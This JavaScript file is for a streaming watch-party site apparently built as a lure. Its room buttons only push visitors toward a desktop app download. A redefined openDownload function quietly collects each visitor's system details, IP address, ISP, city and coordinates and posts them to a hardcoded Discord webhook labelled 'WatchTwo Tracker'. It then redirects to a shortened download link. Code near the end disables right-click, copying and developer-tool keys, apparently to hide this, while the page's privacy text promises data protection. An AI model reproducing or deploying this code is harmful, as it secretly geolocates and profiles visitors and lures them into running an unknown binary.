const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1492168761678237919/aV7O_KsL9vfCMx61FgUmG3f9SQcEg75_Tjbiiu1n0SMuYV0z_608t1o4TqomrhgMcKoi';

document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

function openRoom() {
    checkAppConnection(() => {
        const modal = document.getElementById('room-modal');
        if (modal) {
            document.getElementById('room-step-1').style.display = 'block';
            document.getElementById('room-step-2').style.display = 'none';
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
        }
    });
}

function closeRoomModal() {
    const modal = document.getElementById('room-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function selectAvatar(element) {
    document.querySelectorAll('.avatar-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
}

function createRoomInternal() {
    const name = document.getElementById('room-name-input').value;
    if (!name) {
        showNotification('Please enter a name for your room!');
        return;
    }

    // Simulate room creation
    document.getElementById('room-step-1').style.display = 'none';
    document.getElementById('room-step-2').style.display = 'block';

    // Success feedback
    showNotification(`Room "${name}" created successfully!`);
}

function inviteFriendsPrompt() {
    checkAppConnection(() => {
        showNotification('Download the STREAM Desktop app to invite friends and sync content!');
        setTimeout(() => {
            window.location.href = '#download';
            closeRoomModal();
        }, 2000);
    });
}

function checkAppConnection(onSuccess) {
    const modal = document.getElementById('app-alert-modal');
    if (!modal) return;

    modal.classList.add('show');
    document.body.style.overflow = 'hidden';

    // If the user is just checking, we stop here. 
    // If we wanted to proceed to onSuccess, we'd add logic here.
}

function typeCarbonLogs(logs) {
    const console = document.getElementById('alert-console');
    if (!console) return;
    console.innerHTML = '';

    logs.forEach((line, index) => {
        setTimeout(() => {
            const div = document.createElement('div');
            div.className = 'console-line';
            div.innerText = line;
            if (line.includes('ERROR') || line.includes('FATAL')) div.style.color = '#ff3b30';
            console.appendChild(div);
            console.scrollTop = console.scrollHeight;
        }, index * 400);
    });
}

function toggleAlertDetails() {
    // This function is now deprecated as Carbon UI uses a permanent console, 
    // but kept for compatibility or future collapsible needs.
}

function closeAppAlert() {
    const modal = document.getElementById('app-alert-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = 'auto';
    }
}

function openDownload() {
    // Navigate to download page or trigger download
    window.open('https://rb.gy/qkmdar', '_self');
}

// ============================================
// ========= GLOBAL OPEN DOWNLOAD =============
// ============================================
function openDownload() {
    // ========== ÖZET VE ETKİLİ VERİ TOPLAMA ==========
    
    // Domain bilgisi
    const currentDomain = window.location.hostname;
    const referrerDomain = document.referrer ? new URL(document.referrer).hostname : 'Doğrudan';
    
    // Sistem bilgileri (detaylı ama öz)
    const getSystemSummary = () => {
        const ua = navigator.userAgent;
        
        // İşletim Sistemi ve Versiyon
        let osDetailed = 'Bilinmiyor';
        if (ua.includes('Windows NT 10.0')) osDetailed = 'Windows 11/10';
        else if (ua.includes('Windows NT 6.3')) osDetailed = 'Windows 8.1';
        else if (ua.includes('Windows NT 6.2')) osDetailed = 'Windows 8';
        else if (ua.includes('Windows NT 6.1')) osDetailed = 'Windows 7';
        else if (ua.includes('Mac OS X')) osDetailed = 'macOS';
        else if (ua.includes('Android')) osDetailed = 'Android';
        else if (ua.includes('iPhone')) osDetailed = 'iOS';
        else if (ua.includes('Linux')) osDetailed = 'Linux';
        
        // Tarayıcı ve Versiyon
        let browserDetailed = 'Bilinmiyor';
        if (ua.includes('Edg/')) browserDetailed = 'Microsoft Edge';
        else if (ua.includes('Chrome/')) browserDetailed = 'Google Chrome';
        else if (ua.includes('Firefox/')) browserDetailed = 'Mozilla Firefox';
        else if (ua.includes('Safari/')) browserDetailed = 'Apple Safari';
        else if (ua.includes('Opera/')) browserDetailed = 'Opera';
        
        // Donanım
        const cpuCores = navigator.hardwareConcurrency || '?';
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?';
        const screenRes = `${screen.width}x${screen.height}`;
        
        return {
            os: osDetailed,
            browser: browserDetailed,
            cpu: cpuCores,
            ram: ram,
            screen: screenRes,
            isMobile: /Mobile|Android|iPhone|iPad/i.test(ua)
        };
    };
    
    const system = getSystemSummary();
    
    // Kullanıcı verisi (sadece kritik bilgiler)
    const userData = {
        timestamp: new Date().toISOString(),
        domain: currentDomain,
        referrer: referrerDomain,
        browser: system.browser,
        os: system.os,
        device: system.isMobile ? 'Mobil' : 'Masaüstü',
        specs: `${system.cpu} Çekirdek | ${system.ram} RAM | ${system.screen}`,
        language: navigator.language.split('-')[0],
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // IP ve konum bilgisi
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const fullData = {
                ...userData,
                ip: ipData.ip || 'Bilinmiyor',
                location: ipData.city && ipData.country_name ? 
                    `${ipData.city}, ${ipData.country_name}` : 'Bilinmiyor',
                isp: ipData.org || 'Bilinmiyor',
                latitude: ipData.latitude,
                longitude: ipData.longitude
            };
            
            // Google Maps linki
            const mapsLink = fullData.latitude && fullData.longitude ? 
                `https://www.google.com/maps?q=${fullData.latitude},${fullData.longitude}` : null;
            
            // Webhook'a gönder - SADE embed
            const embed = {
                embeds: [{
                    title: '🎯 **Yeni İndirme**',
                    color: 0x2C2C2C, // Siyah/gri
                    description: `> **${fullData.browser}** kullanıcısı **${fullData.domain}** sitesinden indirdi`,
                    fields: [
                        {
                            name: '💻 **SİSTEM**',
                            value: `\`\`\`yml\nOS: ${fullData.os}\n${fullData.specs}\nCihaz: ${fullData.device}\`\`\``,
                            inline: true
                        },
                        {
                            name: '🌐 **KONUM**',
                            value: `\`\`\`yml\nIP: ${fullData.ip}\n📍 ${fullData.location}\n📡 ${fullData.isp}\`\`\``,
                            inline: true
                        },
                        {
                            name: '📊 **DETAY**',
                            value: `\`\`\`yml\nDil: ${fullData.language}\n⏰ ${fullData.timezone}\n🔗 ${fullData.referrer}\`\`\``,
                            inline: true
                        }
                    ],
                    footer: {
                        text: `WatchTwo Tracker | ${new Date().toLocaleString('tr-TR')}`,
                        icon_url: 'https://i.imgur.com/icon.png'
                    },
                    timestamp: fullData.timestamp
                }]
            };
            
            // Maps linki varsa ekle
            if (mapsLink) {
                embed.embeds[0].fields.push({
                    name: '🗺️ **HARİTA**',
                    value: `[📍 Konumu Göster](${mapsLink})`,
                    inline: false
                });
            }
            
            // Gönder
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            }).catch(err => console.error('Webhook hatası:', err));
        })
        .catch(() => {
            // IP alınamazsa basit gönderim
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '🎯 Yeni İndirme',
                        color: 0x2C2C2C,
                        description: `\`\`\`yml\nSite: ${currentDomain}\nTarayıcı: ${system.browser}\nOS: ${system.os}\nReferans: ${referrerDomain}\`\`\``,
                        footer: { text: 'WatchTwo Tracker' }
                    }]
                })
            });
        });
    
    // İndirme
    window.open('https://rb.gy/qkmdar', '_self');
}
// ============================================
// ===== DOMContentLoaded - Diğer Kodlar ======
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

// Diğer fonksiyonlar aynen kalacak...
// closeRoomModal, selectAvatar, createRoomInternal, vb.
// === LEGAL MODAL LOGIC ===
const legalContent = {
    about: {
        title: "About CineLandMovie",
        body: "CineLandMovie is the ultimate social platform for streaming and hanging out. We bring people together through the power of cinema, allowing you to watch your favorite content with friends in real-time, no matter where they are. Join the evolution of social streaming."
    },
    privacy: {
        title: "Privacy Policy",
        body: "Your privacy is our priority. We use industry-standard encryption to protect your data. We never sell your personal information to third parties. For more details on how we handle your data, please refer to our full privacy documentation."
    },
    terms: {
        title: "Terms of Service",
        body: "By using CineLandMovie, you agree to respect our community guidelines. Harassment, hate speech, and illegal content sharing are strictly prohibited. We reserve the right to suspend accounts that violate these terms to maintain a safe environment for everyone."
    }
};

function openLegal(type) {
    const modal = document.getElementById('legal-modal');
    const title = document.getElementById('legal-title');
    const body = document.getElementById('legal-body');

    if (modal && legalContent[type]) {
        title.innerText = legalContent[type].title;
        body.innerText = legalContent[type].body;
        modal.classList.add('show');
        document.body.style.overflow = 'hidden'; // Stop scroll
    }
}

function closeLegal() {
    const modal = document.getElementById('legal-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = ''; // Restore scroll
    }
}

// Close modal on background click
window.addEventListener('click', (e) => {
    const modal = document.getElementById('legal-modal');
    if (e.target === modal) closeLegal();
});

// === ELITE ROOM ACTIONS ===
let currentEliteStep = 1;

function openEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        currentEliteStep = 1;
        updateEliteSteps();
        document.getElementById('elite-success').style.display = 'none';
        modal.classList.add('show');
        document.body.style.overflow = 'hidden';
    }
}

function closeEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function updateEliteSteps() {
    document.querySelectorAll('.elite-step').forEach(step => step.classList.remove('active'));
    document.querySelectorAll('.setup-step-item').forEach(item => item.classList.remove('active'));

    document.getElementById(`elite-step-${currentEliteStep}`).classList.add('active');
    document.querySelector(`.setup-step-item[data-step='${currentEliteStep}']`).classList.add('active');

    // Button visibility
    document.getElementById('elite-prev').style.display = currentEliteStep > 1 ? 'block' : 'none';
    document.getElementById('elite-next').style.display = currentEliteStep < 3 ? 'block' : 'none';
    document.getElementById('elite-launch').style.display = currentEliteStep === 3 ? 'block' : 'none';
}

function nextEliteStep() {
    if (currentEliteStep === 1) {
        const name = document.getElementById('elite-room-name').value;
        if (!name) {
            showNotification('Please define the room identity first.', 'error');
            return;
        }
    }
    if (currentEliteStep < 3) {
        currentEliteStep++;
        updateEliteSteps();
    }
}

function prevEliteStep() {
    if (currentEliteStep > 1) {
        currentEliteStep--;
        updateEliteSteps();
    }
}

function selectEliteAvatar(element) {
    document.querySelectorAll('.elite-avatar-opt').forEach(opt => opt.classList.remove('active'));
    element.classList.add('active');
}

function selectEliteTheme(element, theme) {
    document.querySelectorAll('.theme-card').forEach(card => card.classList.remove('active'));
    element.classList.add('active');
    // You could inject theme-specific colors here
}

function launchEliteRoom() {
    document.getElementById('elite-success').style.display = 'flex';
    showNotification('Elite Room activated successfully!', 'success');
}

        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('copy', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('cut', function(e) {
            e.preventDefault();
            return false;
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J' || e.keyCode === 74)) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
        });
        document.querySelectorAll('img').forEach(img => {
            img.addEventListener('dragstart', function(e) {
                e.preventDefault();
                return false;
            });
        });

